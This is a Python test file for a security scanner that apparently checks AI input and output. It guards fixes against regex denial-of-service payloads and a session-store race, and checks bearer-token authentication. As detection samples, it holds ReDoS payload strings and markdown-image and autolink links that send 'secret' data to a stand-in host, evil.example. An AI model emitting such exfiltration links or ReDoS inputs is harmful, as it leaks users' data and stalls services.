"""Attack-tests guarding the fixes from adversarial-review round 4 (output-side URL ReDoS, store race)."""

from __future__ import annotations

import time
from concurrent.futures import ThreadPoolExecutor

import pytest

from pink_crow.clock import FixedClock
from pink_crow.engine import Engine
from pink_crow.scoring import new_state
from pink_crow.session import InMemorySessionStore


# 🔴 the two output-side URL ReDoS vectors must be bounded (were ~1950-2380 ms)
@pytest.mark.parametrize(
    "payload",
    [
        "<http://a" * 7281,     # AUTOLINK_RE
        "[](http://a" * 5957,   # MARKDOWN_LINK_RE url-capture
        'src="http://a' * 5000,  # HTML_SRC_RE
    ],
)
def test_url_regex_redos_bounded(payload):
    eng = Engine(clock=FixedClock(0.0))
    t = time.perf_counter()
    eng.scan_output(payload)
    elapsed = time.perf_counter() - t
    assert elapsed < 0.25, f"output URL ReDoS not bounded ({elapsed * 1000:.0f}ms; was ~2000ms)"


# a genuine exfil link is still caught after bounding the URL class
def test_real_exfil_link_still_caught():
    r = Engine(clock=FixedClock(0.0)).scan_output("see ![x](http://evil.example/collect?d=secret)")
    assert any(f.rule_id == "pc.out.exfil_link" for f in r.findings)
    r2 = Engine(clock=FixedClock(0.0)).scan_output("visit <http://evil.example/leak?x=1>")
    assert any(f.rule_id == "pc.out.exfil_link" for f in r2.findings)


# ⚪ the store's move_to_end/evict compound ops must be crash-free under concurrency at the cap boundary
def test_store_concurrent_get_put_no_crash():
    store = InMemorySessionStore(ttl_seconds=3600.0, max_sessions=50)
    for i in range(50):
        store.put(new_state(f"s{i}", now=float(i)))

    def worker(i):
        store.get(f"s{i % 50}", now=1000.0)
        store.put(new_state(f"n{i}", now=1000.0))  # forces eviction at the 50-cap boundary

    with ThreadPoolExecutor(max_workers=16) as ex:
        list(ex.map(worker, range(2000)))
    assert len(store) <= 50


# bearer-token auth still functions (now constant-time compare)
def test_bearer_auth_still_works(monkeypatch):
    pytest.importorskip("fastapi")
    from fastapi.testclient import TestClient

    from pink_crow.gateway.app import create_app

    monkeypatch.setenv("PINKCROW_TOKEN", "sekret")
    c = TestClient(create_app())
    assert c.post("/v1/scan/input", json={"text": "hi"}).status_code == 401
    assert c.post("/v1/scan/input", json={"text": "hi"}, headers={"Authorization": "Bearer sekret"}).status_code == 200
    assert c.post("/v1/scan/input", json={"text": "hi"}, headers={"Authorization": "Bearer wrong"}).status_code == 401
